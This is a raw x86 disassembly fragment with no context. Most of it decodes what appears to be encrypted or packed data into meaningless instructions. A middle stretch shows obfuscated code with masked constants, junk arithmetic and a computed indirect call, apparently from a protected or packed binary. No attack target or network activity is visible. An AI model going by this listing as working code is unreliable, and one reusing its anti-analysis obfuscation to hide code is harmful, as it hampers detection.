  4122a7:	leave  
  4122a8:	(bad)  
  4122a9:	fcmove st,st(3)
  4122ab:	clc    
  4122ac:	sti    
  4122ad:	fdiv   st,st(5)
  4122af:	push   edx
  4122b1:	loope  0x4122a9
  4122b3:	(bad)  
  4122b4:	ror    ah,1
  4122b6:	(bad)  
  4122b7:	neg    cl
  4122b9:	or     dl,al
  4122bb:	add    eax,0x13e70afb
  4122c0:	or     eax,0xc1b2ccce
  4122c5:	int    0xf4
  4122c7:	mov    bh,0xe0
  4122c9:	ror    ebp,1
  4122cb:	in     al,dx
  4122cc:	retf   
  4122cd:	leave  
  4122ce:	fidiv  DWORD PTR [ecx-0x1c0e2534]
  4122d4:	hlt    
  4122d5:	int3   
  4122d6:	pop    es
  4122d7:	loope  0x4122af
  4122d9:	cmc    
  4122da:	(bad)  
  4122db:	retf   0xf5bc
  4122de:	ret    0xe6de
  4122e1:	stos   DWORD PTR es:[edi],eax
  4122e2:	in     al,dx
  4122e3:	out    0xee,al
  4122e5:	(bad)  
  4122e6:	shl    cl,cl
  4122e8:	int    0xfb
  4122ea:	int3   
  4122eb:	mov    ebx,0xfab5f1ca
  4122f0:	stc    
  4122f1:	fdivr  DWORD PTR [esi-0x263e3e10]
  4122f7:	sar    ecx,1
  4122f9:	or     bh,ah
  4122fb:	or     eax,DWORD PTR [esi]
  4122fd:	std    
  4122fe:	leave  
  4122ff:	or     cl,bh
  412301:	jmp    0x4122e1
  412303:	ror    cl,0xca
  412306:	ror    ebp,1
  412308:	sti    
  412309:	(bad)
  41230c:	cmc    
  41230d:	jmp    0xdd2df7da
  412312:	std    
  412313:	rcr    esp,0xf3
  412316:	(bad)  
  412318:	out    0xe3,al
  41231a:	call   0xdf2f1119
  41231f:	add    dl,ah
  412321:	in     eax,0xf3
  412323:	in     eax,0xe1
  412325:	lods   al,BYTE PTR ds:[esi]
  412326:	in     al,0xe7
  412328:	aam    0xd5
  41232a:	in     eax,0xf4
  41232c:	icebp  
  41232d:	clc    
  41232e:	mov    ch,0xdf
  412330:	mov    al,0xf9
  412332:	mov    edi,0xe2c5d0ef
  412337:	sar    ecx,cl
  412339:	sar    al,0x8
  41233c:	vpavgb ymm3,ymm6,ymm1
  412340:	stc    
  412341:	stos   BYTE PTR es:[edi],al
  412342:	icebp  
  412343:	in     eax,0xce
  412345:	mov    esp,0xe9cff5cc
  41234a:	out    dx,al
  41234b:	int    0xfd
  41234d:	mov    ecx,0xfad3bfcb
  412352:	neg    dh
  412354:	rol    DWORD PTR [edx+eax*1],1
  412357:	(bad)  
  412358:	sti    
  412359:	(bad)  
  41235a:	jecxz  0x412342
  41235c:	fcmove st,st(2)
  41235e:	ret    0x2da
  412361:	enter  0xefbe,0xe3
  412365:	div    BYTE PTR [ecx+ecx*8-0x81a4f25]
  41236c:	retf   
  41236d:	in     al,dx
  41236e:	sti    
  41236f:	mov    cl,0xd2
  412371:	ret    
  412372:	lock add esi,esi
  412375:	aad    0xf8
  412377:	fdivr  st(4),st
  412379:	add    bl,bl
  41237b:	(bad)  
  41237c:	fcmovnu st,st(5)
  41237e:	or     al,0xf
  412380:	fadd   st(6),st
  412382:	mov    esp,0xf6b7f3ad
  412387:	(bad)
  41238a:	repnz (bad) 
  41238c:	rcl    al,cl
  41238e:	cli    
  41238f:	in     al,dx
  412390:	iret   
  412391:	idiv   dl
  412393:	(bad)  
  412394:	repnz fild WORD PTR [esi]
  412397:	(bad)  
  412398:	add    BYTE PTR [edi],al
  41239a:	add    cl,ch
  41239c:	ror    BYTE PTR [ecx],0xec
  41239f:	fnsetpm(287 only) 
  4123a1:	ret    0xb2bf
  4123a4:	repz mov bl,0xe3
  4123a7:	mov    dh,0xb5
  4123a9:	retf   
  4123aa:	jmp    0xe3cc:0xffb4acdf
  4123b1:	cli    
  4123b2:	ret    
  4123b3:	sar    BYTE PTR [eax+0x6e1d5c0],cl
  4123b9:	(bad)  
  4123ba:	(bad)  
  4123bb:	loop   0x412391
  4123bd:	loop   0x4123c5
  4123bf:	or     eax,0xbcc7e005
  4123c4:	scas   al,BYTE PTR es:[edi]
  4123c5:	mov    dl,0xf4
  4123c7:	shr    dh,0xc0
  4123ca:	icebp  
  4123cb:	out    dx,eax
  4123cc:	retf   
  4123cd:	iret   
  4123ce:	repnz shl al,1
  4123d1:	shl    dh,1
  4123d3:	idiv   dh
  4123d5:	loope  0x4123c9
  4123d7:	jmp    ebp
  4123d9:	icebp  
  4123da:	(bad)  
  4123dc:	out    dx,al
  4123dd:	sti    
  4123de:	or     BYTE PTR [ecx],cl
  4123e0:	call   0xce0fd7d3
  4123e5:	mov    cl,0xc1
  4123e7:	hlt    
  4123e8:	cli    
  4123e9:	in     eax,0xfa
  4123eb:	mov    bh,0xec
  4123ed:	test   ch,0xca
  4123f0:	icebp  
  4123f1:	cld    
  4123f2:	add    dl,al
  4123f4:	out    0xdf,al
  4123f6:	ffreep st(7)
  4123f8:	fdiv   st,st(5)
  4123fa:	or     esp,ebx
  4123fc:	fisttp DWORD PTR [ebx]
  4123fe:	out    dx,eax
  4123ff:	dec    ecx
  412401:	ret    
  412402:	scas   al,BYTE PTR es:[edi]
  412403:	retf   
  412404:	enter  0xebcf,0xf6
  412408:	ret    0xedc8
  41240b:	fmulp  st(1),st
  41240d:	enter  0xf9b4,0xcf
  412411:	cli    
  412412:	repnz cld 
  412414:	mov    esi,0xe6def7f7
  412419:	std    
  41241a:	enter  0xc801,0xcf
  41241e:	in     eax,0xff
  412420:	stc    
  412421:	ror    bh,1
  412423:	mov    dl,0xc2
  412425:	shr    ebp,cl
  412427:	sti    
  412428:	repnz cli 
  41242a:	out    0xd2,al
  41242c:	mov    eax,0xbafad8cc
  412431:	idiv   edx
  412433:	mov    ecx,0xe6fcdcec
  412438:	rol    BYTE PTR [ebx],cl
  41243a:	fsubp  st(7),st
  41243c:	iret   
  41243d:	cld    
  41243e:	repz loop 0x41242f
  412441:	jecxz  0x4123ec
  412443:	retf   
  412444:	ret    0xf0e6
  412447:	shl    edx,1
  412449:	(bad)  
  41244a:	call   0xdd3df51d
  41244f:	cmc    
  412450:	out    dx,al
  412451:	int3   
  412452:	mov    edi,0x7ffedec
  412457:	mov    ebp,0xd6dee6b8
  41245c:	loop   0x412437
  41245e:	in     al,dx
  41245f:	jecxz  0x412474
  412461:	leave  
  412462:	in     al,0xce
  412464:	lods   eax,DWORD PTR ds:[esi]
  412465:	aad    0xc6
  412467:	int    0xc2
  412469:	out    dx,al
  41246a:	mul    bh
  41246c:	call   0xff44f327
  412471:	ret    
  412472:	fcomip st,st(1)
  412474:	fabs   
  412476:	jecxz  0x412443
  412478:	or     bh,ch
  41247a:	fsub   st,st(1)
  41247c:	fcomp  st(7)
  41247e:	jmp    0xcadc:0xadf2ce08
  412485:	fmul   st(3),st
  412487:	aad    0xf2
  412489:	hlt    
  41248a:	idiv   esi
  41248c:	mov    eax,0xbedbcafc
  412491:	sar    DWORD PTR [ecx-0x3eff0d1e],0xda
  412498:	fmul   DWORD PTR [edx]
  41249a:	jmp    0xdd50f498
  41249f:	int3   
  4124a0:	fmul   st(4),st
  4124a2:	int    0xac
  4124a4:	mul    dh
  4124a6:	shr    BYTE PTR [eax+esi*8-0xd151145],1
  4124ad:	sti    
  4124ae:	int    0xd8
  4124b0:	jmp    0xed2e0cb7
  4124b5:	sti    
  4124b6:	add    eax,DWORD PTR [edi]
  4124b8:	or     ebp,eax
  4124ba:	(bad)  
  4124bc:	(bad)  
  4124bd:	out    dx,eax
  4124be:	push   es
  4124bf:	in     eax,dx
  4124c0:	repz test eax,0xf4f6eff1
  4124c6:	mov    cl,0xb3
  4124c8:	retf   0xd6ef
  4124cb:	repz mov edx,0xfabbdcb8
  4124d1:	aam    0xd4
  4124d3:	icebp  
  4124d4:	int3   
  4124d5:	icebp  
  4124d6:	in     eax,0xc1
  4124d8:	les    eax,FWORD PTR [edx]
  4124da:	mov    esi,0x9f4e2d9
  4124df:	add    al,0xd3
  4124e1:	stos   DWORD PTR es:[edi],eax
  4124e2:	scas   eax,DWORD PTR es:[edi]
  4124e3:	(bad)  
  4124e4:	imul   BYTE PTR [ebp-0x9371e3e]
  4124ea:	(bad)  
  4124eb:	shl    bh,cl
  4124ed:	(bad)  
  4124ee:	jmp    0xe91203f2
  4124f3:	mov    ebp,0xdcf9d1e3
  4124f8:	out    0xdc,eax
  4124fa:	fimul  WORD PTR [ebx]
  4124fc:	add    esi,eax
  4124fe:	std    
  4124ff:	shl    eax,0xe7
  412502:	div    DWORD PTR [eax-0x361c3f4d]
  412508:	leave  
  412509:	mov    dl,0xff
  41250b:	mov    edx,0xd6ecbadb
  412510:	loope  0x4124e9
  412512:	mov    eax,0xddecd8f6
  412517:	ffreep st(0)
  412519:	mov    edi,0xedbcee08
  41251e:	cli    
  41251f:	por    mm5,QWORD PTR [ebx-0x2a093352]
  412526:	(bad)  
  412527:	int3   
  412528:	xlat   BYTE PTR ds:[ebx]
  412529:	(bad)  
  41252a:	repnz int 0xf3
  41252d:	call   0xcd1a0ff0
  412532:	loopne 0x412532
  412534:	fneni(8087 only) 
  412536:	fcmovnb st,st(2)
  412538:	xlat   BYTE PTR ds:[ebx]
  412539:	out    0xc5,al
  41253b:	hlt    
  41253c:	in     eax,dx
  41253d:	pop    es
  41253e:	(bad)
  412542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412543:	mov    bh,0xb3
  412545:	test   cl,0xc0
  412548:	lods   al,BYTE PTR ds:[esi]
  412549:	jmp    0xb840f922
  41254e:	jmp    0x412532
  412550:	lock imul ebp
  412553:	(bad)  
  412554:	out    0xd0,eax
  412556:	icebp  
  412557:	(bad)  
  412558:	jmp    0x10f:0xe1c503fb
  41255f:	retf   
  412560:	loope  0x412540
  412562:	out    0xc0,eax
  412564:	loopne 0x412514
  412566:	in     eax,0xe6
  412568:	cmc    
  412569:	(bad)  
  41256a:	cmc    
  41256b:	(bad)  
  41256c:	in     eax,dx
  41256d:	mov    eax,0xedf1f5cc
  412572:	add    edx,edi
  412574:	idiv   BYTE PTR [eax+eiz*8-0x3e221d0d]
  41257b:	leave  
  41257c:	dec    edx
  41257e:	(bad)  
  41257f:	dec    dl
  412581:	mov    edi,0xdcc5ddc3
  412586:	(bad)  
  412587:	shl    ah,1
  412589:	retf   0xbad9
  41258c:	jmp    0xc01cf248
  412591:	aad    0xe2
  412593:	loop   0x412569
  412595:	xlat   BYTE PTR ds:[ebx]
  412596:	stc    
  412597:	jecxz  0x412582
  412599:	call   0xc3bef82
  41259e:	cli    
  41259f:	ror    edi,0xe1
  4125a2:	mov    edi,0xf0e8e3af
  4125a7:	cli    
  4125a8:	mov    edx,0xd0b8d2ca
  4125ad:	mov    ch,0xdc
  4125af:	jmp    0xdc3b298b
  4125b4:	icebp  
  4125b5:	mov    esp,0xf90ac0f0
  4125ba:	or     cl,BYTE PTR [esi]
  4125bc:	fisttp WORD PTR ds:0xa906cdfc
  4125c2:	(bad)  
  4125c3:	mov    edi,0xb1b2e5f5
  4125c8:	out    0xfa,eax
  4125ca:	out    0xd4,eax
  4125cc:	mov    ch,0xf0
  4125ce:	fcomi  st,st(4)
  4125d0:	out    dx,al
  4125d1:	jecxz  0x4125b4
  4125d3:	(bad)  
  4125d4:	loope  0x4125bd
  4125d6:	int3   
  4125d7:	mov    ecx,0xf7f6ffd8
  4125dc:	clc    
  4125dd:	int    0xe7
  4125df:	(bad)
  4125e2:	test   eax,0xf6c2e9a8
  4125e7:	mov    al,0xe4
  4125e9:	rcl    edi,1
  4125eb:	xlat   BYTE PTR ds:[ebx]
  4125ec:	(bad)  
  4125ee:	mov    eax,DWORD PTR [ecx+eax*4]
  4125f1:	mov    DWORD PTR [ebp-0x38],eax
  4125f4:	jmp    0x4125fe
  4125f9:	jmp    0x40d473
  4125fe:	mov    eax,DWORD PTR [ebp-0x2c]
  412601:	mov    ecx,DWORD PTR [ebp-0x3c]
  412604:	xor    ecx,0x75108b5
  41260a:	add    ecx,0x3272fb
  412610:	cmp    eax,ecx
  412612:	jne    0x41262a
  412618:	mov    eax,DWORD PTR [ebp-0x3c]
  41261b:	xor    eax,0x75108b5
  412620:	add    eax,0x3272fb
  412625:	jmp    0x414dde
  41262a:	mov    eax,DWORD PTR [ebp-0x8]
  41262d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412630:	xor    ecx,0x75108b5
  412636:	add    ecx,0x3272fb
  41263c:	cmp    eax,ecx
  41263e:	je     0x41290b
  412644:	lea    eax,[ebp-0x2c]
  412647:	mov    DWORD PTR [ebp-0x13c],eax
  41264d:	mov    eax,DWORD PTR [ebp-0x10]
  412650:	mov    DWORD PTR [ebp-0x138],eax
  412656:	mov    eax,DWORD PTR [ebp+0xc]
  412659:	mov    DWORD PTR [ebp-0x134],eax
  41265f:	mov    eax,DWORD PTR [ebp-0x134]
  412665:	movzx  eax,WORD PTR [eax+0x20]
  412669:	xor    eax,0x8a9a
  41266e:	add    eax,0x3b61
  412673:	movzx  eax,ax
  412676:	mov    DWORD PTR [ebp-0x114],eax
  41267c:	mov    BYTE PTR [ebp-0x85],0x7a
  412683:	lea    eax,[ebp-0x85]
  412689:	mov    DWORD PTR [ebp-0x10c],eax
  41268f:	movzx  eax,BYTE PTR [ebp-0x85]
  412696:	xor    eax,0x83
  41269b:	add    eax,0x8
  41269e:	mov    ecx,DWORD PTR [ebp-0x10c]
  4126a4:	mov    BYTE PTR [ecx],al
  4126a6:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  4126b0:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  4126ba:	mov    eax,DWORD PTR [ebp-0x118]
  4126c0:	xor    eax,0x75108b5
  4126c5:	add    eax,0x3272fb
  4126ca:	mov    DWORD PTR [ebp-0x120],eax
  4126d0:	jmp    0x4126e2
  4126d5:	mov    eax,DWORD PTR [ebp-0x120]
  4126db:	inc    eax
  4126dc:	mov    DWORD PTR [ebp-0x120],eax
  4126e2:	cmp    DWORD PTR [ebp-0x120],0x40
  4126e9:	jae    0x412707
  4126ef:	mov    eax,DWORD PTR [ebp-0x120]
  4126f5:	mov    cl,BYTE PTR [ebp-0x85]
  4126fb:	mov    BYTE PTR [ebp+eax*1-0xc8],cl
  412702:	jmp    0x4126d5
  412707:	mov    eax,DWORD PTR [ebp-0x118]
  41270d:	xor    eax,0x75108b5
  412712:	add    eax,0x3272fb
  412717:	mov    DWORD PTR [ebp-0x124],eax
  41271d:	jmp    0x41272f
  412722:	mov    eax,DWORD PTR [ebp-0x124]
  412728:	inc    eax
  412729:	mov    DWORD PTR [ebp-0x124],eax
  41272f:	mov    eax,DWORD PTR [ebp-0x114]
  412735:	cmp    DWORD PTR [ebp-0x124],eax
  41273b:	je     0x412791
  412741:	mov    eax,DWORD PTR [ebp-0x124]
  412747:	mov    ecx,DWORD PTR [ebp-0x134]
  41274d:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  412752:	xor    eax,0x8a9a
  412757:	add    eax,0x3b61
  41275c:	movzx  eax,ax
  41275f:	mov    DWORD PTR [ebp-0x128],eax
  412765:	mov    eax,DWORD PTR [ebp-0x124]
  41276b:	mov    ecx,DWORD PTR [ebp-0x134]
  412771:	movzx  eax,WORD PTR [ecx+eax*4]
  412775:	xor    eax,0x8a9a
  41277a:	add    eax,0x3b61
  41277f:	mov    ecx,DWORD PTR [ebp-0x128]
  412785:	mov    BYTE PTR [ebp+ecx*1-0xc8],al
  41278c:	jmp    0x412722
  412791:	mov    eax,DWORD PTR [ebp-0x118]
  412797:	xor    eax,0x75108b5
  41279c:	add    eax,0x3272fb
  4127a1:	mov    ecx,DWORD PTR [ebp-0x13c]
  4127a7:	mov    DWORD PTR [ecx],eax
  4127a9:	mov    eax,DWORD PTR [ebp-0x118]
  4127af:	xor    eax,0x75108b5
  4127b4:	add    eax,0x3272fb
  4127b9:	mov    DWORD PTR [ebp-0x110],eax
  4127bf:	mov    DWORD PTR [ebp-0x84],0xf89c95b0
  4127c9:	mov    eax,DWORD PTR [ebp-0x84]
  4127cf:	xor    eax,0x75108b5
  4127d4:	add    eax,0x3272fb
  4127d9:	je     0x4128ee
  4127df:	lea    eax,[ebp-0x130]
  4127e5:	mov    DWORD PTR [ebp-0x12c],eax
  4127eb:	mov    eax,DWORD PTR [ebp-0x110]
  4127f1:	sub    eax,0x3272fb
  4127f6:	xor    eax,0x75108b5
  4127fb:	mov    ecx,DWORD PTR [ebp-0x12c]
  412801:	mov    DWORD PTR [ecx],eax
  412803:	mov    eax,DWORD PTR [ebp-0x84]
  412809:	xor    eax,0x75108b5
  41280e:	add    eax,0x3272fb
  412813:	mov    ecx,DWORD PTR [ebp-0x11c]
  412819:	xor    ecx,0x75108b5
  41281f:	add    ecx,0x3272fb
  412825:	sub    eax,ecx
  412827:	sub    eax,0x3272fb
  41282c:	xor    eax,0x75108b5
  412831:	mov    DWORD PTR [ebp-0x84],eax
  412837:	mov    eax,DWORD PTR [ebp-0x110]
  41283d:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412845:	movsx  ecx,BYTE PTR [ebp-0x85]
  41284c:	cmp    eax,ecx
  41284e:	je     0x4128c6
  412854:	mov    eax,DWORD PTR [ebp-0x110]
  41285a:	movsx  eax,BYTE PTR [ebp+eax*1-0xc8]
  412862:	mov    ecx,DWORD PTR [ebp-0x130]
  412868:	xor    ecx,0x75108b5
  41286e:	mov    edx,DWORD PTR [ebp-0x138]
  412874:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fb]
  41287c:	cmp    eax,ecx
  41287e:	je     0x41288e
  412884:	jmp    0x412906
  412889:	jmp    0x4128c6
  41288e:	mov    eax,DWORD PTR [ebp-0x130]
  412894:	xor    eax,0x75108b5
  412899:	mov    ecx,DWORD PTR [ebp-0x138]
  41289f:	movsx  eax,BYTE PTR [ecx+eax*1+0x3272fb]
  4128a7:	mov    ecx,DWORD PTR [ebp-0x118]
  4128ad:	xor    ecx,0x75108b5
  4128b3:	add    ecx,0x3272fb
  4128b9:	cmp    eax,ecx
  4128bb:	jne    0x4128c6
  4128c1:	jmp    0x4128ee
  4128c6:	mov    eax,DWORD PTR [ebp-0x11c]
  4128cc:	xor    eax,0x75108b5
  4128d1:	mov    ecx,DWORD PTR [ebp-0x110]
  4128d7:	lea    eax,[ecx+eax*1+0x3272fb]
  4128de:	mov    DWORD PTR [ebp-0x110],eax
  4128e4:	jmp    0x4127c9
  4128e9:	jmp    0x4127c9
  4128ee:	mov    eax,DWORD PTR [ebp-0x11c]
  4128f4:	xor    eax,0x75108b5
  4128f9:	add    eax,0x3272fb
  4128fe:	mov    ecx,DWORD PTR [ebp-0x13c]
  412904:	mov    DWORD PTR [ecx],eax
  412906:	jmp    0x41023e
  41290b:	mov    eax,DWORD PTR [ebp+0x8]
  41290e:	add    eax,DWORD PTR [ebp-0x38]
  412911:	mov    DWORD PTR [ebp-0x34],eax
  412914:	cmp    DWORD PTR [ebp-0x28],0x0
  412918:	je     0x4129d7
  41291e:	mov    DWORD PTR [ebp-0x4c],0x0
  412925:	push   edx
  412926:	pop    eax
  412927:	push   0x5
  412929:	sub    edx,eax
  41292b:	pop    edx
  41292c:	add    edx,0xa
  41292f:	push   edx
  412930:	pop    ecx
  412931:	push   0xa
  412933:	dec    ecx
  412934:	pop    ebx
  412935:	dec    ebx
  412936:	xchg   ebx,ecx
  412938:	sub    ebx,ecx
  41293a:	xchg   ebx,ecx
  41293c:	dec    ecx
  41293d:	mov    eax,DWORD PTR [ebp-0x28]
  412940:	imul   eax,ecx
  412943:	sub    esp,eax
  412945:	mov    DWORD PTR [ebp-0x4c],esp
  412948:	mov    eax,DWORD PTR [ebp-0x3c]
  41294b:	xor    eax,0x75108b5
  412950:	add    eax,0x3272fb
  412955:	mov    DWORD PTR [ebp-0x48],eax
  412958:	mov    eax,DWORD PTR [ebp-0x3c]
  41295b:	xor    eax,0x75108b5
  412960:	mov    ecx,DWORD PTR [ebp-0x48]
  412963:	lea    eax,[ecx+eax*1+0x3272fb]
  41296a:	mov    ecx,DWORD PTR [ebp-0x40]
  41296d:	xor    ecx,0x75108b5
  412973:	add    ecx,0x3272fb
  412979:	mov    edx,DWORD PTR [ebp+0x14]
  41297c:	imul   ecx,DWORD PTR [edx]
  41297f:	cmp    eax,ecx
  412981:	je     0x4129d7
  412987:	mov    ecx,DWORD PTR [ebp-0x3c]
  41298a:	xor    ecx,0x75108b5
  412990:	mov    esi,DWORD PTR [ebp-0x40]
  412993:	xor    esi,0x75108b5
  412999:	add    esi,0x3272fb
  41299f:	mov    eax,DWORD PTR [ebp-0x48]
  4129a2:	mov    edx,DWORD PTR [ebp+0x14]
  4129a5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4129a9:	xor    edx,edx
  4129ab:	div    esi
  4129ad:	lea    eax,[ecx+eax*1+0x3272fb]
  4129b4:	mov    ecx,DWORD PTR [ebp-0x48]
  4129b7:	mov    edx,DWORD PTR [ebp-0x4c]
  4129ba:	mov    DWORD PTR [edx+ecx*4],eax
  4129bd:	mov    eax,DWORD PTR [ebp-0x40]
  4129c0:	xor    eax,0x75108b5
  4129c5:	mov    ecx,DWORD PTR [ebp-0x48]
  4129c8:	lea    eax,[ecx+eax*1+0x3272fb]
  4129cf:	mov    DWORD PTR [ebp-0x48],eax
  4129d2:	jmp    0x412958
  4129d7:	mov    eax,DWORD PTR [ebp-0x3c]
  4129da:	xor    eax,0x75108b5
  4129df:	add    eax,0x3272fb
  4129e4:	mov    DWORD PTR [ebp-0x1c],eax
  4129e7:	and    ebx,0x76575654
  4129ed:	xor    ebx,0x54354364
  4129f3:	xchg   ebx,esi
  4129f5:	xor    ebx,ebx
  4129f7:	push   esi
  4129f8:	mov    esi,ebx
  4129fa:	pop    ebx
  4129fb:	mov    edx,esi
  4129fd:	add    ebx,0x1002
  412a03:	lea    eax,[ebp-0x34]
  412a06:	add    edx,eax
  412a08:	add    edx,0x5
  412a0b:	push   edx
  412a0c:	inc    esi
  412a0d:	pop    ecx
  412a0e:	dec    ecx
  412a0f:	xchg   ecx,eax
  412a10:	dec    eax
  412a11:	xchg   ecx,eax
  412a12:	dec    ecx
  412a13:	xchg   ecx,edx
  412a15:	dec    edx
  412a16:	push   edx
  412a17:	mov    edx,ebx
  412a19:	pop    ebx
  412a1a:	dec    ebx
  412a1b:	call   DWORD PTR [ebx]
  412a1d:	cmp    DWORD PTR [ebp+0x10],esi
  412a20:	je     0x412a41
  412a26:	xchg   edx,eax
  412a27:	push   0xc
  412a29:	pop    ecx
  412a2a:	dec    ecx
  412a2b:	push   0x3
  412a2d:	pop    ebx
  412a2e:	inc    ebx
  412a2f:	xchg   ebx,ecx
  412a31:	inc    ecx
  412a32:	sub    ebx,ecx
  412a34:	xchg   ebx,ecx
  412a36:	dec    ecx
  412a37:	dec    ecx
  412a38:	mov    eax,DWORD PTR [ebp-0x28]
  412a3b:	imul   eax,ecx
  412a3e:	add    esp,eax
  412a40:	xchg   edx,eax
  412a41:	push   eax
  412a42:	jmp    0x414dcb
  412a47:	ret    0xc368
  412a4a:	ret    
  412a4b:	jno    0x412abd
  412a4d:	ret    0x1568
  412a50:	rcl    BYTE PTR [edx],cl
  412a52:	clc    
  412a53:	push   es
  412a54:	sti    
  412a55:	icebp  
  412a56:	sub    eax,DWORD PTR [esi+0x6d]
  412a59:	jnp    0x412ad6
  412a5b:	out    0x98,eax
  412a5d:	jnp    0x412ada
  412a5f:	fst    st(3)
  412a61:	fstp   TBYTE PTR [ebp-0x40393c0e]
  412a67:	(bad)  
  412a6a:	add    eax,0xec06c6c0
  412a6f:	leave  
  412a70:	in     al,dx
  412a71:	out    dx,al
  412a72:	loopne 0x412a4b
  412a74:	in     al,dx
  412a75:	ret    
  412a76:	loop   0x412a22
  412a78:	(bad)  
  412a7b:	fsub   st,st(7)
  412a7d:	mov    ah,0xf2
  412a7f:	enter  0xb8da,0x0
  412a83:	aad    0xf6
  412a85:	out    0xf5,eax
  412a87:	shl    cl,0xb8
  412a8a:	ret    
  412a8b:	mov    esi,0xf304c404
  412a90:	jecxz  0x412a73
  412a92:	enter  0xd0e1,0xb1
  412a96:	int    0xad
  412a98:	mov    cl,0xc1
  412a9a:	xabort 0xd5
  412a9d:	cli    
  412a9e:	call   0xd312ea87
  412aa3:	rcr    ch,1
  412aa5:	pop    es
  412aa6:	fdivp  st(0),st
  412aa8:	sar    DWORD PTR [ebp+eax*8-0x1123382c],cl
  412aaf:	iret   
  412ab0:	push   es
  412ab1:	add    edi,DWORD PTR [ecx-0x2d421b1d]
  412ab7:	sar    BYTE PTR [ebx-0xa441f19],0xd1
  412abe:	ror    eax,1
  412ac0:	mov    edx,0xfdb6cce1
  412ac5:	(bad)  
  412ac7:	rcr    esp,1
  412ac9:	fcmovnb st,st(0)
  412acb:	jmp    0x2c5:0xeb050ec5
  412ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ad3:	rcl    al,1
  412ad5:	test   al,0xef
  412ad7:	aam    0xe3
  412ad9:	shl    edi,1
  412adb:	shl    edx,cl
  412add:	into   
  412ade:	fsubp  st(6),st
  412ae0:	into   
  412ae1:	(bad)  
  412ae3:	(bad)  
  412ae4:	xlat   BYTE PTR ds:[ebx]
  412ae5:	(bad)  
  412ae7:	aam    0xe4
  412ae9:	or     esi,edi
  412aeb:	add    al,0xe9
  412aed:	(bad)  
  412aee:	cmc    
  412aef:	out    0xdd,eax
  412af1:	adc    al,cl
  412af3:	test   eax,0xd2b0c3c2
  412af8:	out    dx,eax
  412af9:	not    edx
  412afb:	int    0xb7
  412afd:	mov    ah,0xea
  412aff:	clc    
  412b00:	ret    
  412b01:	aad    0xd3
  412b03:	aad    0xf1
  412b05:	loop   0x412af3
  412b07:	fild   DWORD PTR [esi*8-0x241b3418]
  412b0e:	leave  
  412b0f:	leave  
  412b10:	add    DWORD PTR [edx],ecx
  412b12:	in     eax,0xe8
  412b14:	shl    DWORD PTR [ecx-0x280c040b],1
  412b1a:	into   
  412b1b:	stc    
  412b1c:	jmp    0xdc1b1e05
  412b21:	ret    0xf6d4
  412b24:	mul    cl
  412b26:	jecxz  0x412ae4
  412b28:	mov    esi,0xfbd4cae8
  412b2e:	cld    
  412b2f:	fcmove st,st(5)
  412b31:	call   0xad14e91a
  412b36:	out    0xe7,al
  412b38:	call   0xc637e108
  412b3d:	rcr    edi,1
  412b3f:	push   ecx
  412b41:	stc    
  412b42:	mov    edi,0xd707ecdb
  412b47:	fcmovnb st,st(2)
  412b49:	add    eax,0xfbc706e2
  412b4e:	jecxz  0x412b38
  412b50:	or     ecx,edi
  412b52:	rcl    cl,0xaf
  412b55:	mov    bh,0xf0
  412b57:	loopne 0x412b19
  412b59:	(bad)  
  412b5a:	mov    ebx,0xb7f2ced6
  412b5f:	int    0xca
  412b61:	cli    
  412b62:	imul   eax
  412b64:	(bad)  
  412b66:	neg    ah
  412b68:	in     eax,0xfa
  412b6a:	shr    ecx,0xe5
  412b6d:	iret   
  412b6e:	enter  0xe4f9,0xe2
  412b72:	lock leave 
  412b74:	mov    esi,0xc2e2b6ed
  412b79:	icebp  
  412b7a:	lock scas al,BYTE PTR es:[edi]
  412b7c:	mov    al,0xfe
  412b7e:	mov    esi,0xfcfdf7ec
  412b83:	(bad)  
  412b84:	loop   0x412b68
  412b86:	fadd   st(3),st
  412b88:	add    bl,cl
  412b8a:	fiadd  WORD PTR ds:0xdac8e4e2
  412b90:	add    DWORD PTR [ecx],ecx
  412b92:	stos   DWORD PTR es:[edi],eax
  412b93:	loopne 0x412b6c
  412b95:	(bad)  
  412b97:	repnz cmc 
  412b99:	lock mov ah,0xd2
  412b9c:	(bad)  
  412b9d:	int    0xf0
  412b9f:	fidiv  DWORD PTR [ecx-0x2d073e01]
  412ba5:	mov    esp,0xdfc2fefb
  412baa:	or     DWORD PTR [eax],ecx
  412bac:	call   0xf42634a7
  412bb1:	add    eax,0xdcdff1e9
  412bb6:	repz loop 0x412ba3
  412bb9:	jmp    0x412bab
  412bbb:	call   0xd319f79f
  412bc0:	in     eax,dx
  412bc1:	ret    
  412bc2:	ret    
  412bc3:	pop    es
  412bc4:	fcom   st(5)
  412bc6:	faddp  st(0),st
  412bc8:	add    ebx,edi
  412bca:	(bad)  
  412bcb:	(bad)  
  412bcd:	out    dx,al
  412bce:	or     edi,esp
  412bd0:	fcmovb st,st(0)
  412bd2:	fidiv  WORD PTR [eax-0x90c5b54]
  412bd8:	test   eax,0xedf9bbe8
  412bdd:	shl    edx,1
  412bdf:	repz mov eax,0x7bfcdff
  412be5:	stc    
  412be6:	pop    es
  412be7:	(bad)  
  412bea:	cld    
  412beb:	rol    al,1
  412bed:	(bad)  
  412bee:	ret    
  412bef:	or     al,0xda
  412bf1:	push   cs
  412bf2:	shr    DWORD PTR [esi-0x522a2909],0xe1
  412bf9:	leave  
  412bfa:	jmp    0xf51800de
  412bff:	in     eax,dx
  412c00:	retf   
  412c01:	loop   0x412bbd
  412c03:	aam    0xe2
  412c05:	fdiv   st(0),st
  412c07:	rol    edi,0xdd
  412c0a:	vpaddusb xmm6,xmm4,xmm5
  412c0e:	ret    
  412c0f:	or     BYTE PTR [edx],dl
  412c11:	leave  
  412c12:	loopne 0x412bfa
  412c14:	out    dx,eax
  412c15:	scas   al,BYTE PTR es:[edi]
  412c16:	shl    ebp,cl
  412c18:	in     eax,dx
  412c19:	jmp    0xedb9:0xf2e8fac1
  412c20:	ror    ebp,1
  412c22:	mov    esp,0xbcfeeedb
  412c27:	sar    ebp,0xbc
  412c2a:	or     BYTE PTR [eax],cl
  412c2c:	(bad)  
  412c2d:	fcmovne st,st(2)
  412c2f:	or     al,BYTE PTR [edx]
